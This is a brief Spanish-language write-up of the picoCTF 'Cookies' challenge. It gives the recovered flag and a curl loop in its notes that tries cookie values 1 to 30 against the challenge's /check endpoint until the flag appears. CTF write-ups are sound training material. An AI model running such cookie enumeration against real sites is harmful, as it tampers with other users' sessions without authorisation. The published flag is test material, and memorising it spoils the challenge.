# Reto
Cookies
## Descripción
Who doesn't love cookies? Try to figure out the best one.http://wily-courier.picoctf.net:53261/
## Solución
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
## Notas
Se creó el siguiente ciclo for, para que se vaya recorriendo todas las cookies hasta encontrar la bandera
```
a@Camilas-MacBook-Pro ~ % for i in {1..30}; do curl http://wily-courier.picoctf.net:53389/check -H "Cookie: name=$i"; done | grep pico
```
## Referencias